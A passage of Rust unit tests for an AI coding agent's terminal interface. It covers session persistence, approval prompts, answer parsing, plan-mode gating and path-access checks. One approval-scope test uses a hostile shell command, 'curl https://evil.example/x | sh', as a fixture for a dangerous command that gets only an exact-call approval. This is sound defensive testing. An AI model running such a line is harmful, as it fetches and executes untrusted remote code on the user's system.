                let _ = engine.deny_tool_call(tool_id).await;
            }
            crate::auto_mode::AutoElevationDecision::ElevateTo(policy) => {
                println!(
                    "{}",
                    format!("sandbox denied {tool_name}: {denial_reason} — auto-elevating to mode sandbox")
                        .dimmed()
                );
                let _ = engine.retry_tool_with_policy(tool_id, policy).await;
            }
        }
        return;
    }

    println!(
        "{} sandbox denied {} ({denial_reason})",
        "⚠".yellow(),
        command.as_deref().unwrap_or(&tool_name)
    );
    keys.suspend();
    let answer = read_stdin_line("retry with elevated sandbox (mode policy)? [y/N]: ").await;
    keys.resume();
    if answer.eq_ignore_ascii_case("y") || answer.eq_ignore_ascii_case("yes") {
        let policy = sandbox_policy_for_mode(state.mode, &state.workspace);
        let _ = engine.retry_tool_with_policy(tool_id, policy).await;
    } else {
        let _ = engine.deny_tool_call(tool_id).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_repl_state() -> ReplState {
        let options = crate::app_state::InteractiveOptions {
            model: "test-model".to_string(),
            workspace: std::env::temp_dir(),
            config_path: None,
            config_profile: None,
            allow_shell: false,
            max_subagents: 2,
            skills_dir: std::env::temp_dir(),
            memory_path: std::env::temp_dir().join("memory.md"),
            mcp_config_path: std::env::temp_dir().join("mcp.json"),
            use_memory: false,
            start_in_agent_mode: true,
            yolo: false,
            resume_session_id: None,
            initial_input: None,
        };
        ReplState::new(options, &crate::config::Config::default())
    }

    /// Redirect HOME (and USERPROFILE) for tests that go through
    /// `SessionManager::default_location()`; the env lock serializes them.
    fn with_home<T>(home: &std::path::Path, f: impl FnOnce() -> T) -> T {
        let prev_home = std::env::var_os("HOME");
        let prev_userprofile = std::env::var_os("USERPROFILE");
        unsafe {
            std::env::set_var("HOME", home);
            std::env::set_var("USERPROFILE", home);
        }
        let result = f();
        unsafe {
            match prev_home {
                Some(value) => std::env::set_var("HOME", value),
                None => std::env::remove_var("HOME"),
            }
            match prev_userprofile {
                Some(value) => std::env::set_var("USERPROFILE", value),
                None => std::env::remove_var("USERPROFILE"),
            }
        }
        result
    }

    /// Round-7 TODO-48 — the turn-boundary persist re-mirrors the inbox
    /// journal: entries the finished turn consumed are dropped (they are now
    /// durable in the session file), anything still queued survives the next
    /// crash.
    #[test]
    fn turn_boundary_persist_mirrors_inbox_journal() {
        let _lock = crate::test_support::lock_test_env();
        let tmp = tempfile::TempDir::new().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();
        with_home(&home, || {
            let manager =
                crate::session_manager::SessionManager::default_location().expect("manager");
            let sessions_dir = manager.sessions_dir().to_path_buf();

            let mut state = test_repl_state();
            state.api_messages = vec![crate::models::Message {
                role: "user".to_string(),
                content: vec![crate::models::ContentBlock::Text {
                    text: "hello".to_string(),
                    cache_control: None,
                }],
            }];
            state.current_session_id = Some("sess-mirror".to_string());
            let journal = crate::interactive::inbox_journal::InboxJournal::for_session(
                &sessions_dir,
                "sess-mirror",
            )
            .expect("journal");
            journal.append("consumed by the finished turn").unwrap();
            state.queued_messages = vec!["still queued".to_string()];

            persist_session_turn_boundary(&mut state);

            let contents = journal.load();
            assert_eq!(
                contents.entries,
                vec!["still queued".to_string()],
                "the persist must drop consumed entries and keep queued ones"
            );
            assert_eq!(contents.corrupt, 0);
        });
    }

    /// Round-7 TODO-48 — startup harvest: a recent orphan journal (its
    /// session crashed before the first persist) seeds the fresh queue and
    /// is re-journaled under the live session id; a stale orphan is just
    /// deleted.
    #[test]
    fn harvest_orphans_seeds_queue_and_rejournals() {
        let _lock = crate::test_support::lock_test_env();
        let tmp = tempfile::TempDir::new().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();
        with_home(&home, || {
            let manager =
                crate::session_manager::SessionManager::default_location().expect("manager");
            let sessions_dir = manager.sessions_dir().to_path_buf();

            let orphan = crate::interactive::inbox_journal::InboxJournal::for_session(
                &sessions_dir,
                "dead-session",
            )
            .expect("journal");
            orphan.append("typed during the crash").unwrap();
            let stale = crate::interactive::inbox_journal::InboxJournal::for_session(
                &sessions_dir,
                "old-session",
            )
            .expect("journal");
            stale.append("long gone").unwrap();
            let stale_path = sessions_dir.join("old-session.inbox.jsonl");
            std::fs::File::options()
                .write(true)
                .open(&stale_path)
                .unwrap()
                .set_modified(
                    std::time::SystemTime::now() - std::time::Duration::from_secs(25 * 3600),
                )
                .unwrap();

            let mut state = test_repl_state();
            let harvested =
                crate::interactive::inbox_journal::harvest_orphans_at_default_location(&mut state);
            assert_eq!(harvested, 1, "only the fresh orphan is harvested");
            assert_eq!(
                state.queued_messages,
                vec!["typed during the crash".to_string()]
            );
            assert!(!sessions_dir.join("dead-session.inbox.jsonl").exists());
            assert!(!stale_path.exists(), "the stale orphan is deleted");
            let new_id = state.current_session_id.as_deref().expect("id minted");
            let rejournaled =
                crate::interactive::inbox_journal::InboxJournal::for_session(&sessions_dir, new_id)
                    .expect("journal");
            assert_eq!(
                rejournaled.load().entries,
                vec!["typed during the crash".to_string()],
                "harvested text is re-journaled under the live session id"
            );
        });
    }

    /// Round-3 TODO-42 — the turn-boundary persist copies the session's
    /// failed-attempt accumulator onto `SavedSession::failed_attempts`
    /// (log-only; never part of `api_messages`).
    #[test]
    fn saved_session_from_state_carries_failed_attempts() {
        let _lock = crate::test_support::lock_test_env();
        let mut state = test_repl_state();
        state.api_messages = vec![crate::models::Message {
            role: "user".to_string(),
            content: vec![crate::models::ContentBlock::Text {
                text: "hello".to_string(),
                cache_control: None,
            }],
        }];
        state.failed_attempts = vec![codesmith_agent_runtime::session_store::AttemptRecord {
            turn_id: "t-1".to_string(),
            step: 1,
            error_category: "authentication".to_string(),
            error_message: "401 unauthorized".to_string(),
            transparent_retries: 0,
            partial_content: false,
            duration_ms: 12,
        }];
        let session = saved_session_from_state(&state).expect("session builds");
        assert_eq!(session.failed_attempts, state.failed_attempts);
        assert_eq!(session.messages.len(), 1);
    }

    /// Round-4 — an approval decision rides the session record, like the
    /// failed-attempt summary beside it: the prompt and its answer must be
    /// recoverable from the file, not only from scrollback.
    #[test]
    fn saved_session_from_state_carries_approval_decisions() {
        let _lock = crate::test_support::lock_test_env();
        let mut state = test_repl_state();
        state.api_messages = vec![crate::models::Message {
            role: "user".to_string(),
            content: vec![crate::models::ContentBlock::Text {
                text: "hello".to_string(),
                cache_control: None,
            }],
        }];
        log_approval(
            &mut state,
            "call-1",
            "exec_shell",
            "shell:exec_shell:abc",
            "shell:cargo build + cargo clippy",
            "always-session",
            None,
        );
        let session = saved_session_from_state(&state).expect("session builds");
        assert_eq!(session.approvals, state.approvals);
        assert_eq!(session.approvals[0].decision, "always-session");
        assert_eq!(
            session.approvals[0].grouping_key,
            "shell:cargo build + cargo clippy"
        );
        assert_eq!(
            session.approvals[0].workspace,
            state.workspace.display().to_string()
        );
    }

    /// TODO-50 — the media attachment record rides the session record the same
    /// way: an admitted image (store path + hash) and a refused one (reason)
    /// are both recoverable from the file. This channel existed in the format
    /// but no producer filled it before.
    #[test]
    fn saved_session_from_state_carries_media_attachment_references() {
        use codesmith_agent_runtime::session_store::{
            ContextReference, ContextReferenceKind, ContextReferenceSource, SessionContextReference,
        };
        let _lock = crate::test_support::lock_test_env();
        let mut state = test_repl_state();
        state.api_messages = vec![crate::models::Message {
            role: "user".to_string(),
            content: vec![crate::models::ContentBlock::Text {
                text: "look".to_string(),
                cache_control: None,
            }],
        }];
        state.context_references.push(SessionContextReference {
            message_index: 0,
            reference: ContextReference {
                kind: ContextReferenceKind::MediaAttachment,
                source: ContextReferenceSource::Attachment,
                badge: "image".to_string(),
                label: "shot.png".to_string(),
                target: "/home/u/.codesmith/attachments/abc.png".to_string(),
                included: true,
                expanded: false,
                detail: Some("sha256:abc 9 bytes image/png".to_string()),
            },
        });
        state
            .context_references
            .push(crate::media::rejected_reference(
                std::path::Path::new("/tmp/huge.png"),
                ContextReferenceSource::AtMention,
                0,
                "too many attachments for one message (9); the limit is 8",
            ));
        let session = saved_session_from_state(&state).expect("session builds");
        assert_eq!(session.context_references, state.context_references);
        assert!(session.context_references[0].reference.included);
        assert!(!session.context_references[1].reference.included);
        assert!(
            session.context_references[1]
                .reference
                .detail
                .as_deref()
                .unwrap()
                .starts_with("rejected:")
        );
    }

    /// The record keeps the refusal text when the user refused with one, since
    /// that sentence is what the model was steered with.
    #[test]
    fn approval_record_keeps_feedback_text() {
        let _lock = crate::test_support::lock_test_env();
        let mut state = test_repl_state();
        log_approval(
            &mut state,
            "call-2",
            "write_file",
            "file:write_file:abc",
            "tool:write_file",
            "feedback",
            Some("先改 cn 文档"),
        );
        assert_eq!(state.approvals.len(), 1);
        assert_eq!(state.approvals[0].feedback.as_deref(), Some("先改 cn 文档"));
        assert!(state.approvals[0].tool_call_id == "call-2");
    }

    #[test]
    fn composer_edits_on_char_boundaries() {
        let mut composer = Composer::default();
        for c in "héllo".chars() {
            composer.insert(c);
        }
        assert_eq!(composer.buffer, "héllo");
        assert_eq!(composer.cursor, "héllo".len());
        composer.backspace();
        assert_eq!(composer.buffer, "héll");
        composer.move_home();
        assert_eq!(composer.cursor, 0);
        composer.move_right(); // past 'h'
        assert_eq!(composer.cursor, 1);
        // The 'é' is two bytes; deleting it must remove the whole character
        // and leave the rest of the buffer intact.
        composer.delete();
        assert_eq!(composer.buffer, "hll");
        composer.move_end();
        composer.insert('!');
        assert_eq!(composer.buffer, "hll!");
    }

    #[test]
    fn composer_kills_like_readline() {
        let mut composer = Composer {
            buffer: "src/utils/foo.ts and more".to_string(),
            cursor: "src/utils/foo.ts".len(),
        };
        // Ctrl+W ignores punctuation: one press removes the whole path.
        assert_eq!(composer.kill_word(), "src/utils/foo.ts");
        assert_eq!(composer.buffer, " and more");
        assert_eq!(composer.cursor, 0);

        composer.cursor = composer.buffer.len();
        assert_eq!(composer.kill_to_start(), " and more");
        assert!(composer.buffer.is_empty());

        composer.buffer = "keep this".to_string();
        composer.cursor = "keep".len();
        assert_eq!(composer.kill_to_end(), " this");
        assert_eq!(composer.buffer, "keep");
    }

    #[test]
    fn composer_take_empties_it() {
        let mut composer = Composer::default();
        composer.insert('a');
        composer.insert('b');
        assert_eq!(composer.take(), "ab");
        assert!(composer.is_empty());
        assert_eq!(composer.cursor, 0);
        assert!(composer.take().is_empty());
    }

    #[test]
    fn queued_line_names_the_first_line_and_the_rest() {
        assert_eq!(queued_line("just one", 1), "⏸ queued (1 pending): just one");
        assert_eq!(
            queued_line("first\nsecond\nthird", 2),
            "⏸ queued (2 pending): first (+2 more line(s))"
        );
    }

    /// A stand-in for the paragraph-length static descriptions that tools like
    /// `exec_shell` carry (the real one is ~1 KB).
    const LONG_DESCRIPTION: &str = "Write content to a UTF-8 file in the workspace. Use this \
         instead of heredocs (`cat <<EOF > file`) or `echo > file` in `exec_shell` — diffs \
         render inline and approval is handled cleanly. Creates or overwrites; parent \
         directories are auto-created.";

    #[test]
    fn approval_frame_header_names_the_tool_and_the_action() {
        let frame = approval_frame(
            "write_file",
            LONG_DESCRIPTION,
            Some("path: notes.txt"),
            Some("recording the state"),
            "every write_file call",
        );
        let header = frame.lines().next().expect("header line");
        assert!(header.contains("approval needed"), "{header}");
        assert!(header.contains("write_file"), "{header}");
        assert!(header.contains("path: notes.txt"), "{header}");
        assert!(
            !header.contains("heredocs"),
            "the static description must not stand in for the action: {header}"
        );
        assert!(frame.contains("intent: recording the state"), "{frame}");
    }

    #[test]
    fn approval_frame_falls_back_to_one_sentence_of_the_description() {
        let frame = approval_frame(
            "diagnostics",
            LONG_DESCRIPTION,
            None,
            None,
            "every diagnostics call",
        );
        let header = frame.lines().next().expect("header line");
        assert!(
            header.contains("Write content to a UTF-8 file in the workspace"),
            "{header}"
        );
        assert!(
            !header.contains("heredocs"),
            "only the first sentence may reach the header: {header}"
        );
        assert!(header.width() <= 140, "header must stay one row: {header}");
    }

    #[test]
    fn approval_label_caps_cjk_by_columns() {
        // A wide-character description must not spend two columns per
        // character against the one-row cap.
        let label = approval_action(&"输".repeat(120), None);
        assert!(
            label.width() <= APPROVAL_LABEL_MAX,
            "action label ran to {} columns",
            label.width()
        );
    }

    #[test]
    fn approval_frame_prompt_is_unterminated_and_scopes_every_answer() {
        let frame = approval_frame(
            "exec_shell",
            "Run a shell command.",
            None,
            None,
            "this command family",
        );
        assert!(
            !frame.ends_with('\n'),
            "the answer echoes on the prompt row, so the frame must not end it"
        );
        assert!(frame.ends_with(": "), "{frame}");
        for scoped in [
            "[y] run it once",
            "[a] always allow this command family for this session",
            "[o] yolo — shell + trust + auto-approve for the rest of this session",
            "[e] never this exact call",
            "[r] <feedback> deny and tell the model why",
        ] {
            assert!(frame.contains(scoped), "missing {scoped:?} in {frame:?}");
        }
        assert!(
            !frame.contains("[n]"),
            "skip is the empty line, not a legend key: {frame}"
        );
    }

    /// The re-ask after a bare `[r]` is a question too: it must leave the
    /// answer on its own row, end at the unterminated prompt, and say what the
    /// line it is about to read is for.
    #[test]
    fn feedback_needed_frame_is_a_prompt_row() {
        let frame = feedback_needed_frame();
        assert!(!frame.ends_with('\n'), "{frame}");
        assert!(frame.ends_with(": "), "{frame}");
        assert!(frame.contains("what should change"), "{frame}");
    }

    #[test]
    fn plan_gate_maps_answers_without_remember_keys() {
        for raw in ["y", "yes", "a", "always", "o", "yolo"] {
            assert_eq!(
                parse_plan_approval_answer(raw),
                ApprovalAnswer::RunOnce,
                "{raw:?} approves this plan (remembered for nothing)"
            );
        }
        for raw in ["n", "no", "e", "never", ""] {
            assert_eq!(
                parse_plan_approval_answer(raw),
                ApprovalAnswer::Skip,
                "{raw:?} rejects this plan (remembered for nothing)"
            );
        }
        assert_eq!(
            parse_plan_approval_answer("r"),
            ApprovalAnswer::NeedFeedback
        );
        assert_eq!(
            parse_plan_approval_answer("make it shorter"),
            ApprovalAnswer::Revise("make it shorter".to_string())
        );
    }

    #[test]
    fn plan_gate_frame_offers_three_choices_and_no_remember_keys() {
        let frame = plan_approval_frame();
        assert!(!frame.ends_with('\n'), "{frame}");
        assert!(frame.ends_with(": "), "{frame}");
        for scoped in ["approve and implement", "reject", "<feedback> revise"] {
            assert!(frame.contains(scoped), "missing {scoped:?} in {frame:?}");
        }
        assert!(
            !frame.contains("[a]"),
            "an approval that outlives the plan it answered must not be offered: {frame}"
        );
        assert!(
            !frame.contains("[e]"),
            "a denial that outlives the plan it answered must not be offered: {frame}"
        );
    }

    /// The answer mapping, split from stdin: the keys match the whole line (so
    /// `y please` is not a yes), `[n]`/empty skip silently, and every other
    /// line is feedback the model gets to hear. Only an explicit key approves
    /// — the fail-closed half survives the rewrite.
    #[test]
    fn approval_answers_map_every_key_and_send_the_rest_as_feedback() {
        assert_eq!(parse_approval_answer("y"), ApprovalAnswer::RunOnce);
        assert_eq!(parse_approval_answer(" YES "), ApprovalAnswer::RunOnce);
        assert_eq!(parse_approval_answer("a"), ApprovalAnswer::AlwaysSession);
        assert_eq!(
            parse_approval_answer("Always"),
            ApprovalAnswer::AlwaysSession
        );
        assert_eq!(parse_approval_answer("o"), ApprovalAnswer::Yolo);
        assert_eq!(parse_approval_answer("YOLO"), ApprovalAnswer::Yolo);
        assert_eq!(parse_approval_answer("e"), ApprovalAnswer::NeverThis);
        assert_eq!(parse_approval_answer("never"), ApprovalAnswer::NeverThis);
        for skip in ["n", "no", "", "  "] {
            assert_eq!(
                parse_approval_answer(skip),
                ApprovalAnswer::Skip,
                "{skip:?} skips the call and says nothing"
            );
        }
        for feedback in [
            // A near-miss on a key, a stray line, and a word that merely
            // starts with `r`: all of them refuse *and* reach the model, which
            // is what a user typing an answer expects.
            "nope",
            "1",
            "why?",
            "y please",
            "run it later",
            // The reported defect: a sentence typed straight at the prompt was
            // read as "unrecognized" and dropped, so the model was told the
            // refusal came with no feedback.
            "快速上线的逻辑改一下。先发版，再默认选最新版本上线",
        ] {
            assert!(
                matches!(parse_approval_answer(feedback), ApprovalAnswer::Revise(_)),
                "{feedback:?} must reach the model as feedback"
            );
            assert!(
                !matches!(
                    parse_approval_answer(feedback),
                    ApprovalAnswer::RunOnce
                        | ApprovalAnswer::AlwaysSession
                        | ApprovalAnswer::Yolo
                        | ApprovalAnswer::NeverThis
                ),
                "{feedback:?} must not answer with a key"
            );
        }
    }

    /// The feedback is carried verbatim, and the case the user typed survives —
    /// the inline match this replaced lowercased the whole line, which would
    /// have turned `R Fix PlanView` into `fix planview`.
    #[test]
    fn revise_answer_carries_feedback_with_its_case() {
        for (line, expected) in [
            // The `r`/`revise` introducer is optional.
            ("r 把列宽也改", "把列宽也改"),
            ("r: 把列宽也改", "把列宽也改"),
            ("R  Fix PlanView casing", "Fix PlanView casing"),
            ("revise also cover the cn docs", "also cover the cn docs"),
            ("把列宽也改", "把列宽也改"),
            ("Fix PlanView casing", "Fix PlanView casing"),
        ] {
            assert_eq!(
                parse_approval_answer(line),
                ApprovalAnswer::Revise(expected.to_string()),
                "{line:?}"
            );
        }
        // A bare introducer asks for the text on the next line rather than
        // sending an empty reason.
        for bare in ["r", "r:", "revise", "revise:"] {
            assert_eq!(
                parse_approval_answer(bare),
                ApprovalAnswer::NeedFeedback,
                "{bare:?}"
            );
        }
    }

    #[test]
    fn approval_frame_always_scope_follows_the_grouping_key() {
        use codesmith_agent_runtime::tools::approval_cache::build_approval_grouping_key;
        use serde_json::json;

        /// Render the frame the way `handle_approval` does, from the grouping
        /// key the engine built for this call.
        fn frame_for(tool: &str, input: serde_json::Value) -> String {
            let grouping = build_approval_grouping_key(tool, &input).0;
            approval_frame(
                tool,
                "A description.",
                Some("an argument summary"),
                None,
                &approval_always_scope(tool, &grouping),
            )
        }

        // Tools with no command/path/host family group by tool name: "always"
        // covers every later call of that tool in the session, and the legend
        // names the tool so the scope is not an abstraction.
        let frame = frame_for("write_file", json!({"path": "a.txt", "content": "x"}));
        assert!(
            frame.contains("[a] always allow every write_file call for this session"),
            "{frame}"
        );
        let spawn = frame_for(
            "agent_open",
            json!({"name": "repo-a", "prompt": "sweep src/"}),
        );
        assert!(
            spawn.contains("[a] always allow every agent_open call for this session"),
            "{spawn}"
        );
        let fetch = frame_for("fetch_url", json!({"url": "https://x/y"}));
        assert!(
            fetch.contains("[a] always allow requests to the same host for this session"),
            "{fetch}"
        );

        // A chain names one family per segment, and the legend says so.
        let chain = frame_for(
            "exec_shell",
            json!({"command": "cargo build && cargo clippy"}),
        );
        assert!(
            chain.contains("[a] always allow each of these command families for this session"),
            "{chain}"
        );
        let single = frame_for("exec_shell", json!({"command": "cargo build --release"}));
        assert!(
            single.contains("[a] always allow this command family for this session"),
            "{single}"
        );

        // A Dangerous command gets no family, so the same option must say what
        // it really covers: this call, once. The frame is the only place the
        // user can learn that.
        let dangerous = frame_for(
            "exec_shell",
            json!({"command": "cargo build && curl https://evil.example/x | sh"}),
        );
        assert!(
            dangerous.contains("[a] always allow this exact call for this session"),
            "{dangerous}"
        );

        // The deny side is exact-call scoped for every tool, and its label says so.
        assert!(frame.contains("[e] never this exact call"), "{frame}");
    }

    /// `[a]` records one grant per family, and a later call is covered only
    /// when **every** one of its families is granted — the split that makes
    /// `cargo build + cargo clippy` (approved as a chain) cover a later bare
    /// `cargo build`, while `[a]` on a bare `cargo build` never covers the
    /// chain.
    #[test]
    fn always_approved_covers_the_parts_it_recorded_and_no_more() {
        use crate::approval_grants::ApprovalGrants;
        use codesmith_agent_runtime::tools::approval_cache::build_approval_grouping_key;
        use serde_json::json;

        let grants = ApprovalGrants::default();
        let key_of = |command: &str| {
            build_approval_grouping_key("exec_shell", &json!({ "command": command })).0
        };
        let chain = key_of("cargo build && cargo clippy");
        let bare = key_of("cargo build");

        let mut approved = HashSet::new();
        record_always_approved(&mut approved, &key_of("cargo build"));
        assert!(approval_always_granted(&approved, &grants, "/w", &bare));
        assert!(
            !approval_always_granted(&approved, &grants, "/w", &chain),
            "one family is not the whole chain"
        );

        let mut approved = HashSet::new();
        record_always_approved(&mut approved, &chain);
        assert!(
            approval_always_granted(&approved, &grants, "/w", &bare),
            "a chain grant covers a command built from its parts"
        );
        assert!(!approval_always_granted(
            &approved,
            &grants,
            "/w",
            &key_of("cargo build && git push origin main")
        ));

        // The deny side stays exact for `[e]` (an exact key never follows the
        // chain), while `/permissions deny` writes the grouping key — matched
        // per part by `approval_session_denied`.
        assert_ne!(key_of("cargo build"), chain);
    }

    /// `[e]` and `/permissions deny` fill the same denial set through two key
    /// shapes: the exact call key and the grouping key. The gate honors both,
    /// and a grouping-key denial vetoes any call whose parts include it.
    #[test]
    fn session_denials_match_exact_and_grouping_key_shapes() {
        use codesmith_agent_runtime::tools::approval_cache::{
            build_approval_grouping_key, build_approval_key,
        };
        use serde_json::json;

        let grouping_of = |command: &str| {
            build_approval_grouping_key("exec_shell", &json!({ "command": command })).0
        };
        let input = json!({ "command": "git status" });
        let exact = build_approval_key("exec_shell", &input).0;

        // `[e]` records the exact key; the gate must still honor it.
        let mut denied = HashSet::new();
        denied.insert(exact.clone());
        assert!(approval_session_denied(
            &denied,
            &exact,
            &grouping_of("git status")
        ));

        // `/permissions deny git status` records `shell:git status` (the same
        // grouping key `/permissions allow` writes) — that key never equals
        // the exact key, and the gate must still refuse the call, including
        // as one part of a compound command.
        let mut denied = HashSet::new();
        denied.insert(grouping_of("git status"));
        assert_ne!(
            denied.iter().next().unwrap().as_str(),
            exact.as_str(),
            "the grouping key the command writes is a different shape than the exact key"
        );
        assert!(approval_session_denied(
            &denied,
            "shell:exec_shell:deadbeef",
            &grouping_of("git status && cargo build")
        ));
        // A family that is not denied does not veto.
        assert!(!approval_session_denied(
            &denied,
            "shell:exec_shell:deadbeef",
            &grouping_of("cargo build")
        ));
    }

    /// The two plan tools are the only results that move this session's mode, and
    /// only when the call actually ran: a refusal is the revise loop, which leaves
    /// plan mode active on purpose.
    #[test]
    fn plan_tool_results_map_to_the_session_mode_change() {
        let exited = Ok(ToolResult::success("Exited plan mode"));
        assert_eq!(
            plan_mode_sync_after_tool("enter_plan_mode", &exited, None),
            Some(PlanModeSync::Enter)
        );
        assert_eq!(
            plan_mode_sync_after_tool("exit_plan_mode", &exited, Some(AppMode::Yolo)),
            Some(PlanModeSync::Exit(AppMode::Yolo)),
            "the restore target is the mode this session came from"
        );
        assert_eq!(
            plan_mode_sync_after_tool("exit_plan_mode", &exited, None),
            Some(PlanModeSync::Exit(AppMode::Agent)),
            "an origin the session never recorded falls back to Agent"
        );
        assert_eq!(
            plan_mode_sync_after_tool(
                "exit_plan_mode",
                &Err(ToolError::execution_failed("denied by user".to_string())),
                Some(AppMode::Agent)
            ),
            None,
            "a refused plan leaves plan mode active — the revise loop"
        );
        assert_eq!(
            plan_mode_sync_after_tool(
                "exit_plan_mode",
                &Ok(ToolResult::error(
                    "Not in plan mode. Call enter_plan_mode first."
                )),
                Some(AppMode::Yolo)
            ),
            None,
            "a failed result must not move the mode either"
        );
        assert_eq!(
            plan_mode_sync_after_tool("write_plan_file", &exited, None),
            None,
            "only the mode-transition tools are read here"
        );
    }

    #[test]
    fn live_frame_closes_an_open_permanent_row_first() {
        let mut view = TurnView::new();
        view.ends_with_newline = false;
        view.draw_live("◉ working");
        assert!(
            view.ends_with_newline,
            "an open permanent row (unterminated prompt) must be closed \
             before the frame takes the row"
        );
        assert!(
            view.live_active,
            "the frame owns the row until it is cleared"
        );
    }

    #[test]
    fn ticker_frame_yields_to_an_open_permanent_row() {
        // A streamed delta mid-paragraph leaves the row open; a tick that
        // drew over it would close the row mid-word — the 250 ms line breaks
        // this repository shipped before the guard.
        let mut view = TurnView::new();
        view.ends_with_newline = false;
        view.tick_live("◉ working");
        assert!(
            !view.live_active,
            "a tick must not draw a frame over an open text row"
        );
        assert!(
            !view.ends_with_newline,
            "a tick must not close an open text row mid-word"
        );
        view.ends_with_newline = true;
        view.tick_live("◉ working");
        assert!(
            view.live_active,
            "once the row is closed the frame draws as usual"
        );
    }

    #[test]
    fn path_access_frame_names_the_path_and_every_answer() {
        let frame = path_access_frame("list_dir", std::path::Path::new("/Users/dev/other-repo"));
        assert!(frame.contains("/Users/dev/other-repo"), "{frame}");
        assert!(frame.contains("list_dir"), "{frame}");
        assert!(frame.contains("[y] allow it now"), "{frame}");
        assert!(
            frame.contains("[a] always allow it in this workspace"),
            "{frame}"
        );
        assert!(frame.contains("[n] skip"), "{frame}");
    }

    /// Only an explicit "yes" allows, and only an explicit "always" persists:
    /// a typo, an empty line, or EOF must leave the path untrusted.
    #[test]
    fn path_access_answers_fail_closed() {
        assert_eq!(parse_path_access_answer("y"), PathAccessAnswer::AllowNow);
        assert_eq!(
            parse_path_access_answer(" YES "),
            PathAccessAnswer::AllowNow
        );
        assert_eq!(
            parse_path_access_answer("a"),
            PathAccessAnswer::AllowAndRemember
        );
        assert_eq!(
            parse_path_access_answer("Always"),
            PathAccessAnswer::AllowAndRemember
        );
        for refuse in ["n", "no", "", "  ", "nope", "1", "yolo"] {
            assert_eq!(
                parse_path_access_answer(refuse),
                PathAccessAnswer::Decline,
                "{refuse:?} must not allow"
            );
        }
    }

    /// The plan-body approval block: the plan file's *content* is printed
    /// before the approval question, so the answer is informed (the defect
    /// this renders for: the file existed but the user only ever saw the
    /// `update_plan` step list).
    #[tokio::test]
    // The env lock serializes env mutation across the test binary; every
    // other holder acquires it only briefly (no blocking), so holding the
    // guard across this await cannot deadlock.
    #[allow(clippy::await_holding_lock)]
    async fn plan_approval_block_renders_the_plan_body_before_the_question() {
        let _lock = crate::test_support::lock_test_env();
        let tmp = tempfile::TempDir::new().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();

        let slug = "plan_testbody";
        let plan = "# 合并「开发中 / 已上线」\n\n\
                    - 状态筛选替换单选组，删除 el-radio-group 的 v-if 守卫\n\
                    - i18n 各加两键\n";
        let block = with_home_async(&home, async {
            codesmith_tool_impls::tools::plan_file::write_plan_file(slug, plan)
                .await
                .expect("write plan file");

            let state = test_repl_state();
            *state.plan_mode_state.lock().await =
                codesmith_agent_runtime::tool_state::plan_mode::PlanModeState {
                    active: true,
                    current_slug: Some(slug.to_string()),
                };
            plan_approval_block(&state).await
        })
        .await;

        let plain = strip_ansi_for_test(&block);
        assert!(plain.contains("已定稿的计划"), "{plain}");
        assert!(plain.contains("合并「开发中 / 已上线」"), "{plain}");
        assert!(plain.contains("状态筛选替换单选组"), "{plain}");
        assert!(
            !plain.contains('#') && plain.contains("el-radio-group 的"),
            "markdown markers are consumed: {plain}"
        );
        assert!(plain.contains('▸') && plain.contains('•'), "{plain}");
        // Every plan line inside the block stays within the width budget.
        // The render runs at the full terminal width and the block indent is
        // added afterwards, so the printed row budget is width + indent.
        let budget = super::super::plan_view::columns() + PLAN_BLOCK_INDENT;
        for line in plain.lines().filter(|line| {
            line.contains("合并")
                || line.contains("状态筛选")
                || line.contains("i18n")
                || line.contains("开发中")
        }) {
            assert!(
                line.width() <= budget,
                "plan line over budget ({budget}): {line:?}"
            );
        }
    }

    /// A plan slug whose file was never written must fail loud, not print an
    /// empty block that reads as an approved-but-empty plan.
    #[tokio::test]
    // Same env-lock justification as the plan-body test above.
    #[allow(clippy::await_holding_lock)]
    async fn plan_approval_block_warns_when_the_plan_file_is_missing() {
        let _lock = crate::test_support::lock_test_env();
        let tmp = tempfile::TempDir::new().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();

        let block = with_home_async(&home, async {
            let state = test_repl_state();
            *state.plan_mode_state.lock().await =
                codesmith_agent_runtime::tool_state::plan_mode::PlanModeState {
                    active: true,
                    current_slug: Some("plan_never_written".to_string()),
                };
            plan_approval_block(&state).await
        })
        .await;

        let plain = strip_ansi_for_test(&block);
        assert!(plain.contains("⚠"), "{plain}");
        assert!(plain.contains("plan_never_written"), "{plain}");
    }

    /// [`with_home`] for async tests: the redirect has to be in place across
    /// the await, and `tokio::runtime::Handle::block_on` inside a tokio test
    /// would panic.
    async fn with_home_async<T>(
        home: &std::path::Path,
        future: impl std::future::Future<Output = T>,
    ) -> T {
        let prev_home = std::env::var_os("HOME");
        let prev_userprofile = std::env::var_os("USERPROFILE");
        unsafe {
            std::env::set_var("HOME", home);
            std::env::set_var("USERPROFILE", home);
        }
        let result = future.await;
        unsafe {
            match prev_home {
                Some(value) => std::env::set_var("HOME", value),
                None => std::env::remove_var("HOME"),
            }
            match prev_userprofile {
                Some(value) => std::env::set_var("USERPROFILE", value),
                None => std::env::remove_var("USERPROFILE"),
            }
        }
        result
    }

    /// ANSI-stripping for assertions on rendered blocks.
    fn strip_ansi_for_test(text: &str) -> String {
        let mut out = String::new();
        let mut chars = text.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\u{1b}' {
                for next in chars.by_ref() {
                    if next.is_ascii_alphabetic() {
                        break;
                    }
                }
                continue;
            }
            out.push(c);
        }
        out
    }

    /// A seeded stand-in for the shared sub-agent manager: `list()` returns
    /// exactly what the test put in the record.
    struct SeededSubAgents(Vec<crate::tools::subagent::SubAgentResult>);

    #[async_trait::async_trait]
    impl codesmith_agent_runtime::host_services::SubAgentApi for SeededSubAgents {
        async fn running_count(&self) -> usize {
            self.0
                .iter()
                .filter(|agent| agent.status == crate::tools::subagent::SubAgentStatus::Running)
                .count()
        }

        async fn list(&self) -> Vec<crate::tools::subagent::SubAgentResult> {
            self.0.clone()
        }

        async fn cleanup(&self, _max_age: Duration) {}

        async fn live_running_snapshots(&self) -> Vec<crate::tools::subagent::SubAgentResult> {
            self.0
                .iter()
                .filter(|agent| agent.status == crate::tools::subagent::SubAgentStatus::Running)
                .cloned()
                .collect()
        }
    }

    fn running_snapshot(id: &str) -> crate::tools::subagent::SubAgentResult {
        crate::tools::subagent::SubAgentResult {
            name: id.to_string(),
            agent_id: id.to_string(),
            context_mode: "fresh".to_string(),
